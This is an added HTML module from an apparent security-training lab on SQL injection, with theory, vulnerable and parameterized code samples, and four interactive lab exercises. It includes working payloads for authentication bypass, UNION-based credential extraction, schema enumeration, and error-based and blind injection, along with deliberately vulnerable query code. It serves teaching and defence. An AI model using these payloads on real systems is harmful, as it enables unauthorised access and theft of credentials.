@@ -1,0 +1,364 @@
+<!-- Module 2: SQL Injection -->
+<h1>Module 02 — SQL Injection</h1>
+
+<!-- ============================================
+     THEORY SECTION
+     ============================================ -->
+<section class="theory-section">
+  <h2>Why SQL Injection Exists</h2>
+  <p>
+    SQL injection occurs when user-supplied input is concatenated directly into a SQL query string
+    instead of being passed as a parameterized value. The database engine cannot distinguish between
+    code and data, so attacker-controlled input becomes part of the query logic.
+  </p>
+
+  <h3>Vulnerable Code: String Concatenation</h3>
+  <pre><code class="language-php">// PHP — VULNERABLE
+$username = $_POST['username'];
+$password = $_POST['password'];
+$query = "SELECT * FROM users WHERE username='$username' AND password_hash='$password'";
+$result = mysqli_query($conn, $query);</code></pre>
+
+  <pre><code class="language-python"># Python — VULNERABLE
+username = request.form['username']
+password = request.form['password']
+query = f"SELECT * FROM users WHERE username='{username}' AND password_hash='{password}'"
+cursor.execute(query)</code></pre>
+
+  <p>
+    If an attacker submits <code>' OR '1'='1</code> as the username, the resulting query becomes:
+  </p>
+
+  <pre><code class="language-sql">SELECT * FROM users WHERE username='' OR '1'='1' AND password_hash='anything'</code></pre>
+
+  <p>
+    Because <code>'1'='1'</code> is always true, the WHERE clause matches every row and
+    authentication is bypassed.
+  </p>
+
+  <h3>Safe Code: Parameterized Queries</h3>
+  <pre><code class="language-php">// PHP — SAFE (prepared statement)
+$stmt = $conn->prepare("SELECT * FROM users WHERE username=? AND password_hash=?");
+$stmt->bind_param("ss", $username, $password);
+$stmt->execute();</code></pre>
+
+  <pre><code class="language-python"># Python — SAFE (parameterized)
+cursor.execute(
+    "SELECT * FROM users WHERE username=? AND password_hash=?",
+    (username, password)
+)</code></pre>
+
+  <div class="callout callout-danger">
+    <strong>Root cause:</strong> The query is built by concatenating untrusted strings. Parameterized
+    queries solve this by separating the SQL structure from the data values, making injection impossible.
+  </div>
+
+  <h2>UNION-Based SQL Injection</h2>
+  <p>
+    A <code>UNION SELECT</code> attack appends a second query to the original, letting the attacker
+    read data from arbitrary tables. Two requirements must be met:
+  </p>
+  <ol>
+    <li>The number of columns in the injected <code>SELECT</code> must match the original query.</li>
+    <li>The data types of corresponding columns must be compatible (or NULL).</li>
+  </ol>
+
+  <h3>Step 1 — Discover the Column Count</h3>
+  <p>
+    Use the <code>ORDER BY</code> technique: increment the column index until an error occurs.
+    The last successful index equals the number of columns.
+  </p>
+
+  <pre><code class="language-sql">-- If the query has 4 columns:
+' ORDER BY 1--    (OK)
+' ORDER BY 2--    (OK)
+' ORDER BY 3--    (OK)
+' ORDER BY 4--    (OK)
+' ORDER BY 5--    (ERROR — column 5 does not exist, so there are 4 columns)</code></pre>
+
+  <p>
+    Alternatively, use <code>UNION SELECT NULL</code> with increasing NULLs:
+  </p>
+
+  <pre><code class="language-sql">' UNION SELECT NULL--              (error — wrong column count)
+' UNION SELECT NULL,NULL--         (error)
+' UNION SELECT NULL,NULL,NULL--    (error)
+' UNION SELECT NULL,NULL,NULL,NULL--  (success — 4 columns!)</code></pre>
+
+  <h3>Step 2 — NULL Padding</h3>
+  <p>
+    Once you know the column count, use <code>NULL</code> as a placeholder for columns you do not
+    need. NULLs are compatible with every data type:
+  </p>
+
+  <pre><code class="language-sql">' UNION SELECT username, password_hash, NULL, NULL FROM users--</code></pre>
+
+  <h3>Step 3 — Extract Data</h3>
+  <p>
+    With the column count known, you can pull data from any table. Use
+    <code>group_concat()</code> to merge multiple rows into a single value when only one output
+    column is available:
+  </p>
+
+  <pre><code class="language-sql">-- Single-column extraction trick
+' UNION SELECT group_concat(username || ':' || password_hash, '&lt;br&gt;'), NULL, NULL, NULL FROM users--</code></pre>
+
+  <h2>Schema Enumeration (SQLite)</h2>
+  <p>
+    In SQLite, the <code>sqlite_master</code> table lists every table and its schema:
+  </p>
+
+  <pre><code class="language-sql">-- List all table names
+SELECT name FROM sqlite_master WHERE type='table';
+
+-- Get the CREATE TABLE statement
+SELECT sql FROM sqlite_master WHERE type='table' AND name='secret_table';</code></pre>
+
+  <p>
+    In other databases, equivalent catalog tables exist:
+  </p>
+  <ul>
+    <li><strong>MySQL:</strong> <code>information_schema.tables</code>, <code>information_schema.columns</code></li>
+    <li><strong>PostgreSQL:</strong> <code>information_schema.tables</code>, <code>pg_catalog.pg_tables</code></li>
+    <li><strong>SQL Server:</strong> <code>INFORMATION_SCHEMA.TABLES</code>, <code>sys.tables</code></li>
+  </ul>
+
+  <h2>Other SQL Injection Techniques</h2>
+
+  <h3>Error-Based Injection</h3>
+  <p>
+    When the application displays database error messages, an attacker can craft queries that
+    deliberately cause errors containing data. For example, in MySQL:
+  </p>
+  <pre><code class="language-sql">-- MySQL error-based extraction
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT user()),FLOOR(RAND(0)*2))x
+  FROM information_schema.tables GROUP BY x)a)--</code></pre>
+
+  <h3>Blind SQL Injection</h3>
+  <p>
+    When no data or errors are displayed, attackers infer information one bit at a time by observing
+    application behavior differences (Boolean-based) or response timing (time-based):
+  </p>
+  <pre><code class="language-sql">-- Boolean-based blind
+' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--
+
+-- Time-based blind (MySQL)
+' AND IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0)--</code></pre>
+
+  <div class="callout callout-info">
+    <strong>Blind injection is slow</strong> but powerful. Tools like <code>sqlmap</code> automate
+    the process of extracting entire databases character by character.
+  </div>
+
+  <h2>Real-World Impact</h2>
+  <p>
+    SQL injection consistently ranks in the OWASP Top 10. Notable breaches include:
+  </p>
+  <ul>
+    <li><strong>Heartland Payment Systems (2008):</strong> 130 million credit card numbers stolen via SQLi.</li>
+    <li><strong>Sony Pictures (2011):</strong> Unparameterized queries led to full database exfiltration.</li>
+    <li><strong>TalkTalk (2015):</strong> Personal details of 157,000 customers accessed through SQLi.</li>
+  </ul>
+
+  <div class="callout callout-warning">
+    <strong>Defense in depth:</strong> Beyond parameterized queries, use least-privilege DB accounts,
+    web application firewalls, input validation, and avoid exposing raw error messages to users.
+  </div>
+</section>
+
+<!-- ============================================
+     LAB 1: Authentication Bypass
+     ============================================ -->
+<div class="lab-container" id="lab1">
+  <div class="lab-header">
+    <div class="lab-title">
+      <span class="lab-num">Lab 1</span> Authentication Bypass
+    </div>
+    <span class="lab-status" id="lab1-status"></span>
+  </div>
+
+  <div class="lab-objective">
+    <strong>Objective:</strong> The login form below constructs a SQL query by concatenating your input
+    directly into the WHERE clause. Bypass authentication without knowing a valid password. Try payloads
+    like <code>' OR '1'='1</code> in the username or password field.
+  </div>
+
+  <div class="banner banner-success" id="lab1-banner">Login bypassed! You authenticated without a valid password.</div>
+
+  <p class="mb-md" style="font-size:0.82rem; color:var(--text-muted);">
+    Vulnerable query:
+    <code>SELECT * FROM users WHERE username='[input]' AND password_hash='[input]'</code>
+  </p>
+
+  <div class="query-display" id="lab1-query">
+    SELECT * FROM users WHERE username='<span class="injected"></span>' AND password_hash='<span class="injected"></span>'
+  </div>
+
+  <div class="encoder-grid">
+    <div class="input-group">
+      <label>Username</label>
+      <input class="input-field" type="text" id="lab1-username" placeholder="Enter username..." />
+    </div>
+    <div class="input-group">
+      <label>Password</label>
+      <input class="input-field" type="text" id="lab1-password" placeholder="Enter password..." />
+    </div>
+  </div>
+
+  <div class="flex gap-sm mb-md">
+    <button class="btn btn-primary" id="lab1-login">Login</button>
+    <button class="btn btn-secondary" id="lab1-reset">Clear</button>
+  </div>
+
+  <div class="sql-result" id="lab1-result"></div>
+  <div class="sql-error" id="lab1-error" style="display:none"></div>
+
+  <div class="query-log" id="lab1-log">
+    <div class="query-log-title">Query Log</div>
+  </div>
+</div>
+
+<!-- ============================================
+     LAB 2: Column Count Discovery
+     ============================================ -->
+<div class="lab-container" id="lab2">
+  <div class="lab-header">
+    <div class="lab-title">
+      <span class="lab-num">Lab 2</span> Column Count Discovery
+    </div>
+    <span class="lab-status" id="lab2-status"></span>
+  </div>
+
+  <div class="lab-objective">
+    <strong>Objective:</strong> The product search below queries a table with an unknown number of columns.
+    Use <code>ORDER BY</code> with increasing column indices to find where it breaks, or try
+    <code>UNION SELECT NULL,NULL,...</code> until the query succeeds. Discover that the table has
+    <strong>4 columns</strong>.
+  </div>
+
+  <div class="banner banner-success" id="lab2-banner">Column count discovered! The products table has 4 columns.</div>
+
+  <p class="mb-md" style="font-size:0.82rem; color:var(--text-muted);">
+    Vulnerable query:
+    <code>SELECT * FROM products WHERE name LIKE '%[input]%'</code>
+  </p>
+
+  <div class="query-display" id="lab2-query">
+    SELECT * FROM products WHERE name LIKE '%<span class="injected"></span>%'
+  </div>
+
+  <div class="input-group">
+    <label>Product Search</label>
+    <input class="input-field" type="text" id="lab2-search" placeholder="Search products or inject SQL..." />
+  </div>
+
+  <div class="flex gap-sm mb-md">
+    <button class="btn btn-primary" id="lab2-run">Search</button>
+    <button class="btn btn-secondary" id="lab2-reset">Clear</button>
+  </div>
+
+  <div class="table-wrapper">
+    <div class="sql-result" id="lab2-result"></div>
+  </div>
+  <div class="sql-error" id="lab2-error" style="display:none"></div>
+
+  <div class="query-log" id="lab2-log">
+    <div class="query-log-title">Query Log</div>
+  </div>
+</div>
+
+<!-- ============================================
+     LAB 3: UNION Data Extraction
+     ============================================ -->
+<div class="lab-container" id="lab3">
+  <div class="lab-header">
+    <div class="lab-title">
+      <span class="lab-num">Lab 3</span> UNION Data Extraction
+    </div>
+    <span class="lab-status" id="lab3-status"></span>
+  </div>
+
+  <div class="lab-objective">
+    <strong>Objective:</strong> Now that you know the products table has 4 columns, craft a
+    <code>UNION SELECT</code> to extract all usernames and password hashes from the <code>users</code>
+    table. Remember to pad with <code>NULL</code> for unused columns.
+  </div>
+
+  <div class="banner banner-success" id="lab3-banner">Data extracted! You retrieved user credentials via UNION injection.</div>
+
+  <p class="mb-md" style="font-size:0.82rem; color:var(--text-muted);">
+    Vulnerable query:
+    <code>SELECT * FROM products WHERE name LIKE '%[input]%'</code>
+  </p>
+
+  <div class="query-display" id="lab3-query">
+    SELECT * FROM products WHERE name LIKE '%<span class="injected"></span>%'
+  </div>
+
+  <div class="input-group">
+    <label>Product Search</label>
+    <input class="input-field" type="text" id="lab3-search" placeholder="Craft a UNION SELECT to extract user data..." />
+  </div>
+
+  <div class="flex gap-sm mb-md">
+    <button class="btn btn-primary" id="lab3-run">Search</button>
+    <button class="btn btn-secondary" id="lab3-reset">Clear</button>
+  </div>
+
+  <div class="table-wrapper">
+    <div class="sql-result" id="lab3-result"></div>
+  </div>
+  <div class="sql-error" id="lab3-error" style="display:none"></div>
+
+  <div class="query-log" id="lab3-log">
+    <div class="query-log-title">Query Log</div>
+  </div>
+</div>
+
+<!-- ============================================
+     LAB 4: Schema Enumeration & Flag Capture
+     ============================================ -->
+<div class="lab-container" id="lab4">
+  <div class="lab-header">
+    <div class="lab-title">
+      <span class="lab-num">Lab 4</span> Schema Enumeration
+    </div>
+    <span class="lab-status" id="lab4-status"></span>
+  </div>
+
+  <div class="lab-objective">
+    <strong>Objective:</strong> There is a hidden table in this database containing a secret flag.
+    Use <code>sqlite_master</code> to discover all table names, then extract the flag value.
+    Hint: <code>SELECT name FROM sqlite_master WHERE type='table'</code> will list tables.
+  </div>
+
+  <div class="banner banner-success" id="lab4-banner">Flag captured! You enumerated the schema and found the secret.</div>
+
+  <p class="mb-md" style="font-size:0.82rem; color:var(--text-muted);">
+    Vulnerable query:
+    <code>SELECT * FROM products WHERE name LIKE '%[input]%'</code>
+  </p>
+
+  <div class="query-display" id="lab4-query">
+    SELECT * FROM products WHERE name LIKE '%<span class="injected"></span>%'
+  </div>
+
+  <div class="input-group">
+    <label>Product Search</label>
+    <input class="input-field" type="text" id="lab4-search" placeholder="Explore sqlite_master to find hidden tables..." />
+  </div>
+
+  <div class="flex gap-sm mb-md">
+    <button class="btn btn-primary" id="lab4-run">Search</button>
+    <button class="btn btn-secondary" id="lab4-reset">Clear</button>
+  </div>
+
+  <div class="table-wrapper">
+    <div class="sql-result" id="lab4-result"></div>
+  </div>
+  <div class="sql-error" id="lab4-error" style="display:none"></div>
+
+  <div class="query-log" id="lab4-log">
+    <div class="query-log-title">Query Log</div>
+  </div>
+</div>
